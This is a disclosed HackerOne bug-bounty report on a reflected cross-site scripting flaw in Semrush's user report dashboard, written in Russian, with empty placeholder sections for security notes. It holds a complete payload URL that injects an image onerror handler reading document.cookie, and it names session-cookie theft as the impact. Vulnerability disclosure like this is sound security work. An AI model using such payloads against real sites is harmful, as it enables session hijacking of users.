---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '491023'
original_report_id: '491023'
title: XSS Reflected on my_report
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: semrush
created_at: '2019-02-04T15:03:22.948Z'
disclosed_at: '2019-06-21T13:16:31.318Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 23
asset_identifier: '*.semrush.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# XSS Reflected on my_report

## Metadata

- HackerOne Report ID: 491023
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: semrush
- Disclosed At: 2019-06-21T13:16:31.318Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Еще раз привет. На этот раз, кроме HTML-инъекции проходит полноценный XSS в дашбоарде пользователя.

Payload: https://www.semrush.com/my_reports/api/v1/document%22%3E%3Cimg%20src=x%20onerror=alert(document.cookie)%3E/4007861

PoC: На скрине

## Impact

Кража сессионных куков.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
